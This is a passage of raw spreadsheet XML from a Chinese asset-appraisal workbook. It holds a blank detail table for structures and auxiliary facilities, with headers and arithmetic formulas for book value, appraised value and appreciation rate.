      </c>
      <c r="L34" s="555">
        <f>L32-L33</f>
        <v/>
      </c>
      <c r="M34" s="380" t="n"/>
      <c r="N34" s="555">
        <f>N32-N33</f>
        <v/>
      </c>
      <c r="O34" s="555">
        <f>L34-J34</f>
        <v/>
      </c>
      <c r="P34" s="555">
        <f>N34-K34</f>
        <v/>
      </c>
      <c r="Q34" s="555">
        <f>IF(K34=0,"",ROUND(P34/K34*100,2))</f>
        <v/>
      </c>
      <c r="R34" s="555">
        <f>IF(H34=0,"",ROUND(L34/H34,0))</f>
        <v/>
      </c>
      <c r="S34" s="213" t="n"/>
      <c r="T34" s="410">
        <f>T32-K33</f>
        <v/>
      </c>
    </row>
  </sheetData>
  <mergeCells count="21">
    <mergeCell ref="E5:E6"/>
    <mergeCell ref="Q5:Q6"/>
    <mergeCell ref="J5:K5"/>
    <mergeCell ref="B2:S2"/>
    <mergeCell ref="L5:N5"/>
    <mergeCell ref="F5:F6"/>
    <mergeCell ref="B1:S1"/>
    <mergeCell ref="B34:D34"/>
    <mergeCell ref="O5:P5"/>
    <mergeCell ref="I5:I6"/>
    <mergeCell ref="B33:D33"/>
    <mergeCell ref="G5:G6"/>
    <mergeCell ref="S5:S6"/>
    <mergeCell ref="B32:D32"/>
    <mergeCell ref="R3:S3"/>
    <mergeCell ref="B5:B6"/>
    <mergeCell ref="D5:D6"/>
    <mergeCell ref="H5:H6"/>
    <mergeCell ref="R5:R6"/>
    <mergeCell ref="T5:T6"/>
    <mergeCell ref="C5:C6"/>
  </mergeCells>
  <conditionalFormatting sqref="D7:D16">
    <cfRule type="expression" priority="2" dxfId="3">
      <formula>_xlfn.ISFORMULA(D7)</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="B5:S6 B7:C13 B14:S34">
    <cfRule type="expression" priority="3" dxfId="3">
      <formula>_xlfn.ISFORMULA(B5)</formula>
    </cfRule>
  </conditionalFormatting>
  <conditionalFormatting sqref="E7:S13">
    <cfRule type="expression" priority="1" dxfId="3">
      <formula>_xlfn.ISFORMULA(E7)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67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 codeName="Sheet57">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:S34"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" topLeftCell="A12" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="M7" sqref="M7"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="16" customWidth="1" style="410" min="1" max="1"/>
    <col width="11.6666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="18.6666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="7.16666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="8.83333333333333" customWidth="1" style="410" min="5" max="5"/>
    <col width="4.33333333333333" customWidth="1" style="410" min="6" max="6"/>
    <col width="5.16666666666667" customWidth="1" style="410" min="7" max="8"/>
    <col width="8.66666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col width="12.6666666666667" customWidth="1" style="410" min="10" max="11"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="12" max="12"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="13" max="13"/>
    <col outlineLevel="1" width="12.6666666666667" customWidth="1" style="410" min="14" max="16"/>
    <col outlineLevel="1" width="8.5" customWidth="1" style="410" min="17" max="17"/>
    <col outlineLevel="1" width="11.3333333333333" customWidth="1" style="410" min="18" max="18"/>
    <col width="7.16666666666667" customWidth="1" style="410" min="19" max="19"/>
    <col width="9" customWidth="1" style="410" min="2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固定资产—构筑物及其他辅助设施评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="17.25" customHeight="1" s="415">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="17.2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373" t="n"/>
      <c r="N3" s="373" t="n"/>
      <c r="O3" s="373" t="n"/>
      <c r="P3" s="373" t="n"/>
      <c r="Q3" s="600" t="inlineStr">
        <is>
          <t>表4-8-2</t>
        </is>
      </c>
    </row>
    <row r="4" ht="17.2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176" t="n"/>
      <c r="O4" s="176" t="n"/>
      <c r="P4" s="176" t="n"/>
      <c r="Q4" s="176" t="n"/>
      <c r="R4" s="176" t="n"/>
      <c r="S4" s="176">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" customFormat="1" s="369">
      <c r="A5" s="116" t="inlineStr">
        <is>
          <t>检索表头1</t>
        </is>
      </c>
      <c r="B5" s="380" t="inlineStr">
        <is>
          <t>序号</t>
        </is>
      </c>
      <c r="C5" s="380" t="inlineStr">
        <is>
          <t>名称</t>
        </is>
      </c>
      <c r="D5" s="380" t="inlineStr">
        <is>
          <t>结构</t>
        </is>
      </c>
      <c r="E5" s="380" t="inlineStr">
        <is>
          <t>建成
年月</t>
        </is>
      </c>
      <c r="F5" s="177" t="inlineStr">
        <is>
          <t>长度
(m)</t>
        </is>
      </c>
      <c r="G5" s="177" t="inlineStr">
        <is>
          <t>宽度
(m)</t>
        </is>
      </c>
      <c r="H5" s="177" t="inlineStr">
        <is>
          <t>计量单位</t>
        </is>
      </c>
      <c r="I5" s="264" t="inlineStr">
        <is>
          <t>面积/体积</t>
        </is>
      </c>
      <c r="J5" s="380" t="inlineStr">
        <is>
          <t>账面价值</t>
        </is>
      </c>
      <c r="K5" s="567" t="n"/>
      <c r="L5" s="380" t="inlineStr">
        <is>
          <t>评估价值</t>
        </is>
      </c>
      <c r="M5" s="593" t="n"/>
      <c r="N5" s="567" t="n"/>
      <c r="O5" s="380" t="inlineStr">
        <is>
          <t>增值额</t>
        </is>
      </c>
      <c r="P5" s="567" t="n"/>
      <c r="Q5" s="185" t="inlineStr">
        <is>
          <t>增值率%</t>
        </is>
      </c>
      <c r="R5" s="264" t="inlineStr">
        <is>
          <t>评估原值单价(元/m2)</t>
        </is>
      </c>
      <c r="S5" s="264" t="inlineStr">
        <is>
          <t>备注</t>
        </is>
      </c>
    </row>
    <row r="6" customFormat="1" s="369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307" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="K6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="L6" s="380" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="M6" s="380" t="inlineStr">
        <is>
          <t>成新率%</t>
        </is>
      </c>
      <c r="N6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="O6" s="380" t="inlineStr">
        <is>
          <t>原值</t>
        </is>
      </c>
      <c r="P6" s="380" t="inlineStr">
        <is>
          <t>净值</t>
        </is>
      </c>
      <c r="Q6" s="594" t="n"/>
      <c r="R6" s="594" t="n"/>
      <c r="S6" s="594" t="n"/>
    </row>
    <row r="7" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="180" t="n"/>
      <c r="D7" s="380" t="n"/>
      <c r="E7" s="587" t="n"/>
      <c r="F7" s="380" t="n"/>
      <c r="G7" s="380" t="n"/>
      <c r="H7" s="380" t="n"/>
      <c r="I7" s="233" t="n"/>
      <c r="J7" s="555" t="n"/>
      <c r="K7" s="555" t="n"/>
      <c r="L7" s="555" t="n"/>
      <c r="M7" s="380" t="n"/>
      <c r="N7" s="555">
        <f>ROUND(L7*M7/100,-2)</f>
        <v/>
      </c>
      <c r="O7" s="555">
        <f>L7-J7</f>
        <v/>
      </c>
      <c r="P7" s="555">
        <f>N7-K7</f>
        <v/>
      </c>
      <c r="Q7" s="555">
        <f>IF(K7=0,"",ROUND(P7/K7*100,2))</f>
        <v/>
      </c>
      <c r="R7" s="555">
        <f>IF(I7=0,"",ROUND(L7/I7,0))</f>
        <v/>
      </c>
      <c r="S7" s="243" t="n"/>
    </row>
    <row r="8" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="180" t="n"/>
      <c r="D8" s="380" t="n"/>
      <c r="E8" s="587" t="n"/>
      <c r="F8" s="380" t="n"/>
      <c r="G8" s="380" t="n"/>
      <c r="H8" s="380" t="n"/>
      <c r="I8" s="233" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555" t="n"/>
      <c r="L8" s="555" t="n"/>
      <c r="M8" s="380" t="n"/>
      <c r="N8" s="555">
        <f>ROUND(L8*M8/100,-2)</f>
        <v/>
      </c>
      <c r="O8" s="555">
        <f>L8-J8</f>
        <v/>
      </c>
      <c r="P8" s="555">
        <f>N8-K8</f>
        <v/>
      </c>
      <c r="Q8" s="555">
        <f>IF(K8=0,"",ROUND(P8/K8*100,2))</f>
        <v/>
      </c>
      <c r="R8" s="555">
        <f>IF(I8=0,"",ROUND(L8/I8,0))</f>
        <v/>
      </c>
      <c r="S8" s="243" t="n"/>
    </row>
    <row r="9" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="180" t="n"/>
      <c r="D9" s="380" t="n"/>
      <c r="E9" s="587" t="n"/>
      <c r="F9" s="380" t="n"/>
      <c r="G9" s="380" t="n"/>
      <c r="H9" s="380" t="n"/>
      <c r="I9" s="233" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555" t="n"/>
      <c r="L9" s="555" t="n"/>
      <c r="M9" s="380" t="n"/>
      <c r="N9" s="555">
        <f>ROUND(L9*M9/100,-2)</f>
        <v/>
      </c>
      <c r="O9" s="555">
        <f>L9-J9</f>
        <v/>
      </c>
      <c r="P9" s="555">
        <f>N9-K9</f>
        <v/>
      </c>
      <c r="Q9" s="555">
        <f>IF(K9=0,"",ROUND(P9/K9*100,2))</f>
        <v/>
      </c>
      <c r="R9" s="555">
        <f>IF(I9=0,"",ROUND(L9/I9,0))</f>
        <v/>
      </c>
      <c r="S9" s="243" t="n"/>
    </row>
    <row r="10" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="180" t="n"/>
      <c r="D10" s="380" t="n"/>
      <c r="E10" s="587" t="n"/>
      <c r="F10" s="380" t="n"/>
      <c r="G10" s="380" t="n"/>
      <c r="H10" s="380" t="n"/>
      <c r="I10" s="233" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555" t="n"/>
      <c r="L10" s="555" t="n"/>
      <c r="M10" s="380" t="n"/>
      <c r="N10" s="555">
        <f>ROUND(L10*M10/100,-2)</f>
        <v/>
      </c>
      <c r="O10" s="555">
        <f>L10-J10</f>
        <v/>
      </c>
      <c r="P10" s="555">
        <f>N10-K10</f>
        <v/>
      </c>
      <c r="Q10" s="555">
        <f>IF(K10=0,"",ROUND(P10/K10*100,2))</f>
        <v/>
      </c>
      <c r="R10" s="555">
        <f>IF(I10=0,"",ROUND(L10/I10,0))</f>
        <v/>
      </c>
      <c r="S10" s="243" t="n"/>
    </row>
    <row r="11" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="380" t="n"/>
      <c r="E11" s="587" t="n"/>
      <c r="F11" s="380" t="n"/>
      <c r="G11" s="380" t="n"/>
      <c r="H11" s="380" t="n"/>
      <c r="I11" s="233" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555" t="n"/>
      <c r="L11" s="555" t="n"/>
      <c r="M11" s="380" t="n"/>
      <c r="N11" s="555">
        <f>ROUND(L11*M11/100,-2)</f>
        <v/>
      </c>
      <c r="O11" s="555">
        <f>L11-J11</f>
        <v/>
      </c>
      <c r="P11" s="555">
        <f>N11-K11</f>
        <v/>
      </c>
      <c r="Q11" s="555">
        <f>IF(K11=0,"",ROUND(P11/K11*100,2))</f>
        <v/>
      </c>
      <c r="R11" s="555">
        <f>IF(I11=0,"",ROUND(L11/I11,0))</f>
        <v/>
      </c>
      <c r="S11" s="243" t="n"/>
    </row>
    <row r="12" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="380" t="n"/>
      <c r="E12" s="587" t="n"/>
      <c r="F12" s="380" t="n"/>
      <c r="G12" s="380" t="n"/>
      <c r="H12" s="380" t="n"/>
      <c r="I12" s="233" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555" t="n"/>
      <c r="L12" s="555" t="n"/>
      <c r="M12" s="380" t="n"/>
      <c r="N12" s="555">
        <f>ROUND(L12*M12/100,-2)</f>
        <v/>
      </c>
      <c r="O12" s="555">
        <f>L12-J12</f>
        <v/>
      </c>
      <c r="P12" s="555">
        <f>N12-K12</f>
        <v/>
      </c>
      <c r="Q12" s="555">
        <f>IF(K12=0,"",ROUND(P12/K12*100,2))</f>
        <v/>
      </c>
      <c r="R12" s="555">
        <f>IF(I12=0,"",ROUND(L12/I12,0))</f>
        <v/>
      </c>
      <c r="S12" s="243" t="n"/>
    </row>
    <row r="13" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="380" t="n"/>
      <c r="E13" s="587" t="n"/>
      <c r="F13" s="380" t="n"/>
      <c r="G13" s="380" t="n"/>
      <c r="H13" s="380" t="n"/>
      <c r="I13" s="233" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555" t="n"/>
      <c r="L13" s="555" t="n"/>
      <c r="M13" s="380" t="n"/>
      <c r="N13" s="555">
        <f>ROUND(L13*M13/100,-2)</f>
        <v/>
      </c>
      <c r="O13" s="555">
        <f>L13-J13</f>
        <v/>
      </c>
      <c r="P13" s="555">
        <f>N13-K13</f>
        <v/>
      </c>
      <c r="Q13" s="555">
        <f>IF(K13=0,"",ROUND(P13/K13*100,2))</f>
        <v/>
      </c>
      <c r="R13" s="555">
        <f>IF(I13=0,"",ROUND(L13/I13,0))</f>
        <v/>
      </c>
      <c r="S13" s="243" t="n"/>
    </row>
    <row r="14" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="380" t="n"/>
      <c r="E14" s="587" t="n"/>
      <c r="F14" s="380" t="n"/>
      <c r="G14" s="380" t="n"/>
      <c r="H14" s="380" t="n"/>
      <c r="I14" s="233" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555" t="n"/>
      <c r="L14" s="555" t="n"/>
      <c r="M14" s="380" t="n"/>
      <c r="N14" s="555">
        <f>ROUND(L14*M14/100,-2)</f>
        <v/>
      </c>
      <c r="O14" s="555">
        <f>L14-J14</f>
        <v/>
      </c>
      <c r="P14" s="555">
        <f>N14-K14</f>
        <v/>
      </c>
      <c r="Q14" s="555">
        <f>IF(K14=0,"",ROUND(P14/K14*100,2))</f>
        <v/>
      </c>
      <c r="R14" s="555">
        <f>IF(I14=0,"",ROUND(L14/I14,0))</f>
        <v/>
      </c>
      <c r="S14" s="243" t="n"/>
    </row>
    <row r="15" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="380" t="n"/>
      <c r="E15" s="587" t="n"/>
      <c r="F15" s="380" t="n"/>
      <c r="G15" s="380" t="n"/>
      <c r="H15" s="380" t="n"/>
      <c r="I15" s="233" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555" t="n"/>
      <c r="L15" s="555" t="n"/>
      <c r="M15" s="380" t="n"/>
      <c r="N15" s="555">
        <f>ROUND(L15*M15/100,-2)</f>
        <v/>
      </c>
      <c r="O15" s="555">
        <f>L15-J15</f>
        <v/>
      </c>
      <c r="P15" s="555">
        <f>N15-K15</f>
        <v/>
      </c>
      <c r="Q15" s="555">
        <f>IF(K15=0,"",ROUND(P15/K15*100,2))</f>
        <v/>
      </c>
      <c r="R15" s="555">
        <f>IF(I15=0,"",ROUND(L15/I15,0))</f>
        <v/>
      </c>
      <c r="S15" s="243" t="n"/>
    </row>
    <row r="16" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="380" t="n"/>
      <c r="E16" s="587" t="n"/>
      <c r="F16" s="380" t="n"/>
      <c r="G16" s="380" t="n"/>
      <c r="H16" s="380" t="n"/>
      <c r="I16" s="233" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555" t="n"/>
      <c r="L16" s="555" t="n"/>
      <c r="M16" s="380" t="n"/>
      <c r="N16" s="555">
        <f>ROUND(L16*M16/100,-2)</f>
        <v/>
      </c>
      <c r="O16" s="555">
        <f>L16-J16</f>
        <v/>
      </c>
      <c r="P16" s="555">
        <f>N16-K16</f>
        <v/>
      </c>
      <c r="Q16" s="555">
        <f>IF(K16=0,"",ROUND(P16/K16*100,2))</f>
        <v/>
      </c>
      <c r="R16" s="555">
        <f>IF(I16=0,"",ROUND(L16/I16,0))</f>
        <v/>
      </c>
      <c r="S16" s="243" t="n"/>
    </row>
    <row r="17" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="380" t="n"/>
      <c r="E17" s="587" t="n"/>
      <c r="F17" s="380" t="n"/>
      <c r="G17" s="380" t="n"/>
      <c r="H17" s="380" t="n"/>
      <c r="I17" s="233" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555" t="n"/>
      <c r="L17" s="555" t="n"/>
      <c r="M17" s="380" t="n"/>
      <c r="N17" s="555">
        <f>ROUND(L17*M17/100,-2)</f>
        <v/>
      </c>
      <c r="O17" s="555">
        <f>L17-J17</f>
        <v/>
      </c>
      <c r="P17" s="555">
        <f>N17-K17</f>
        <v/>
      </c>
      <c r="Q17" s="555">
        <f>IF(K17=0,"",ROUND(P17/K17*100,2))</f>
        <v/>
      </c>
      <c r="R17" s="555">
        <f>IF(I17=0,"",ROUND(L17/I17,0))</f>
        <v/>
      </c>
      <c r="S17" s="243" t="n"/>
    </row>
    <row r="18" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="380" t="n"/>
      <c r="E18" s="587" t="n"/>
      <c r="F18" s="380" t="n"/>
      <c r="G18" s="380" t="n"/>
      <c r="H18" s="380" t="n"/>
      <c r="I18" s="233" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555" t="n"/>
      <c r="L18" s="555" t="n"/>
      <c r="M18" s="380" t="n"/>
      <c r="N18" s="555">
        <f>ROUND(L18*M18/100,-2)</f>
        <v/>
      </c>
      <c r="O18" s="555">
        <f>L18-J18</f>
        <v/>
      </c>
      <c r="P18" s="555">
        <f>N18-K18</f>
        <v/>
      </c>
      <c r="Q18" s="555">
        <f>IF(K18=0,"",ROUND(P18/K18*100,2))</f>
        <v/>
      </c>
      <c r="R18" s="555">
        <f>IF(I18=0,"",ROUND(L18/I18,0))</f>
        <v/>
      </c>
      <c r="S18" s="243" t="n"/>
    </row>
    <row r="19" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="380" t="n"/>
      <c r="E19" s="587" t="n"/>
      <c r="F19" s="380" t="n"/>
      <c r="G19" s="380" t="n"/>
      <c r="H19" s="380" t="n"/>
      <c r="I19" s="233" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555" t="n"/>
      <c r="L19" s="555" t="n"/>
      <c r="M19" s="380" t="n"/>
      <c r="N19" s="555">
        <f>ROUND(L19*M19/100,-2)</f>
        <v/>
      </c>
      <c r="O19" s="555">
        <f>L19-J19</f>
        <v/>
      </c>
      <c r="P19" s="555">
        <f>N19-K19</f>
        <v/>
      </c>
      <c r="Q19" s="555">
        <f>IF(K19=0,"",ROUND(P19/K19*100,2))</f>
        <v/>
      </c>
      <c r="R19" s="555">
        <f>IF(I19=0,"",ROUND(L19/I19,0))</f>
        <v/>
      </c>
      <c r="S19" s="243" t="n"/>
    </row>
    <row r="20" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="380" t="n"/>
      <c r="E20" s="587" t="n"/>
      <c r="F20" s="380" t="n"/>
      <c r="G20" s="380" t="n"/>
      <c r="H20" s="380" t="n"/>
      <c r="I20" s="233" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555" t="n"/>
      <c r="L20" s="555" t="n"/>
      <c r="M20" s="380" t="n"/>
      <c r="N20" s="555">
        <f>ROUND(L20*M20/100,-2)</f>
        <v/>
      </c>
      <c r="O20" s="555">
        <f>L20-J20</f>
        <v/>
      </c>
      <c r="P20" s="555">
        <f>N20-K20</f>
        <v/>
      </c>
      <c r="Q20" s="555">
        <f>IF(K20=0,"",ROUND(P20/K20*100,2))</f>
        <v/>
      </c>
      <c r="R20" s="555">
        <f>IF(I20=0,"",ROUND(L20/I20,0))</f>
        <v/>
      </c>
      <c r="S20" s="243" t="n"/>
    </row>
    <row r="21" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="380" t="n"/>
      <c r="E21" s="587" t="n"/>
      <c r="F21" s="380" t="n"/>
      <c r="G21" s="380" t="n"/>
      <c r="H21" s="380" t="n"/>
      <c r="I21" s="233" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555" t="n"/>
      <c r="L21" s="555" t="n"/>
      <c r="M21" s="380" t="n"/>
      <c r="N21" s="555">
        <f>ROUND(L21*M21/100,-2)</f>
        <v/>
      </c>
      <c r="O21" s="555">
        <f>L21-J21</f>
        <v/>
      </c>
      <c r="P21" s="555">
        <f>N21-K21</f>
        <v/>
      </c>
      <c r="Q21" s="555">
        <f>IF(K21=0,"",ROUND(P21/K21*100,2))</f>
        <v/>
      </c>
      <c r="R21" s="555">
        <f>IF(I21=0,"",ROUND(L21/I21,0))</f>
        <v/>
      </c>
      <c r="S21" s="243" t="n"/>
    </row>
    <row r="22" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="380" t="n"/>
      <c r="E22" s="587" t="n"/>
      <c r="F22" s="380" t="n"/>
      <c r="G22" s="380" t="n"/>
      <c r="H22" s="380" t="n"/>
      <c r="I22" s="233" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555" t="n"/>
      <c r="L22" s="555" t="n"/>
      <c r="M22" s="380" t="n"/>
      <c r="N22" s="555">
        <f>ROUND(L22*M22/100,-2)</f>
        <v/>
      </c>
      <c r="O22" s="555">
        <f>L22-J22</f>
        <v/>
      </c>
      <c r="P22" s="555">
        <f>N22-K22</f>
        <v/>
      </c>
      <c r="Q22" s="555">
        <f>IF(K22=0,"",ROUND(P22/K22*100,2))</f>
        <v/>
      </c>
      <c r="R22" s="555">
        <f>IF(I22=0,"",ROUND(L22/I22,0))</f>
        <v/>
      </c>
      <c r="S22" s="243" t="n"/>
    </row>
    <row r="23" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="380" t="n"/>
      <c r="E23" s="587" t="n"/>
      <c r="F23" s="380" t="n"/>
      <c r="G23" s="380" t="n"/>
      <c r="H23" s="380" t="n"/>
      <c r="I23" s="233" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555" t="n"/>
      <c r="L23" s="555" t="n"/>
      <c r="M23" s="380" t="n"/>
      <c r="N23" s="555">
        <f>ROUND(L23*M23/100,-2)</f>
        <v/>
      </c>
      <c r="O23" s="555">
        <f>L23-J23</f>
        <v/>
      </c>
      <c r="P23" s="555">
        <f>N23-K23</f>
        <v/>
      </c>
      <c r="Q23" s="555">
        <f>IF(K23=0,"",ROUND(P23/K23*100,2))</f>
        <v/>
      </c>
      <c r="R23" s="555">
        <f>IF(I23=0,"",ROUND(L23/I23,0))</f>
        <v/>
      </c>
      <c r="S23" s="243" t="n"/>
    </row>
    <row r="24" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="380" t="n"/>
      <c r="E24" s="587" t="n"/>
      <c r="F24" s="380" t="n"/>
      <c r="G24" s="380" t="n"/>
      <c r="H24" s="380" t="n"/>
      <c r="I24" s="233" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555" t="n"/>
      <c r="L24" s="555" t="n"/>
      <c r="M24" s="380" t="n"/>
      <c r="N24" s="555">
        <f>ROUND(L24*M24/100,-2)</f>
        <v/>
      </c>
      <c r="O24" s="555">
        <f>L24-J24</f>
        <v/>
      </c>
      <c r="P24" s="555">
        <f>N24-K24</f>
        <v/>
      </c>
      <c r="Q24" s="555">
        <f>IF(K24=0,"",ROUND(P24/K24*100,2))</f>
        <v/>
      </c>
      <c r="R24" s="555">
        <f>IF(I24=0,"",ROUND(L24/I24,0))</f>
        <v/>
      </c>
      <c r="S24" s="243" t="n"/>
    </row>
    <row r="25" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="380" t="n"/>
      <c r="E25" s="587" t="n"/>
      <c r="F25" s="380" t="n"/>
      <c r="G25" s="380" t="n"/>
      <c r="H25" s="380" t="n"/>
      <c r="I25" s="233" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555" t="n"/>
      <c r="L25" s="555" t="n"/>
      <c r="M25" s="380" t="n"/>
      <c r="N25" s="555">
        <f>ROUND(L25*M25/100,-2)</f>
        <v/>
      </c>
      <c r="O25" s="555">
        <f>L25-J25</f>
        <v/>
      </c>
      <c r="P25" s="555">
        <f>N25-K25</f>
        <v/>
      </c>
      <c r="Q25" s="555">
        <f>IF(K25=0,"",ROUND(P25/K25*100,2))</f>
        <v/>
      </c>
      <c r="R25" s="555">
        <f>IF(I25=0,"",ROUND(L25/I25,0))</f>
        <v/>
      </c>
      <c r="S25" s="243" t="n"/>
    </row>
    <row r="26" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="380" t="n"/>
      <c r="E26" s="587" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="380" t="n"/>
      <c r="H26" s="380" t="n"/>
      <c r="I26" s="233" t="n"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555" t="n"/>
      <c r="L26" s="555" t="n"/>
      <c r="M26" s="380" t="n"/>
      <c r="N26" s="555">
        <f>ROUND(L26*M26/100,-2)</f>
        <v/>
      </c>
      <c r="O26" s="555">
        <f>L26-J26</f>
        <v/>
      </c>
      <c r="P26" s="555">
        <f>N26-K26</f>
        <v/>
      </c>
      <c r="Q26" s="555">
        <f>IF(K26=0,"",ROUND(P26/K26*100,2))</f>
        <v/>
      </c>
      <c r="R26" s="555">
        <f>IF(I26=0,"",ROUND(L26/I26,0))</f>
        <v/>
      </c>
      <c r="S26" s="243" t="n"/>
    </row>
    <row r="27" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="380" t="n"/>
      <c r="E27" s="587" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="380" t="n"/>
      <c r="H27" s="380" t="n"/>
      <c r="I27" s="233" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555" t="n"/>
      <c r="L27" s="555" t="n"/>
      <c r="M27" s="380" t="n"/>
      <c r="N27" s="555">
        <f>ROUND(L27*M27/100,-2)</f>
        <v/>
      </c>
      <c r="O27" s="555">
        <f>L27-J27</f>
        <v/>
      </c>
      <c r="P27" s="555">
        <f>N27-K27</f>
        <v/>
      </c>
      <c r="Q27" s="555">
        <f>IF(K27=0,"",ROUND(P27/K27*100,2))</f>
        <v/>
      </c>
      <c r="R27" s="555">
        <f>IF(I27=0,"",ROUND(L27/I27,0))</f>
        <v/>
      </c>
      <c r="S27" s="243" t="n"/>
    </row>
    <row r="28" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="380" t="n"/>
      <c r="E28" s="587" t="n"/>
      <c r="F28" s="380" t="n"/>
      <c r="G28" s="380" t="n"/>
      <c r="H28" s="380" t="n"/>
